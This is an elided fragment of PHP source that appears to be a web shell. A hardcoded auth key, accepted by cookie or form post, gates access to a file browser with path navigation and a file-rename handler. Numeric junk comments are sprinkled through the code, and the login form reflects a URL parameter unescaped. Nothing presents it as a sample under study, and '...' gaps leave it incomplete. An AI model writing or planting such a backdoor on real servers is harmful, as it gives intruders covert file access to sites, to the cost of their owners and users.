...
$auth_key = "7c362e749305a67a7b203362871b6bc0";
...
$pass = false;
if (isset($_COOKIE['pw_name_67666'])) {
    if(($_COOKIE['pw_name_67666']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_67666'])) {
        if(($_POST['pw_name_67666']) == $auth_key) {
            setcookie("pw_name_67666", $_POST['pw_name_67666']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_67666' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739867533774611 1739867533491318 1739867533842240 1739867533958804
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739867533774611 1739867533491318 1739867533842240 1739867533958804
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739867533774611 1739867533491318 1739867533842240 1739867533958804
            $name = PATH . "/" . $_GET['r'];
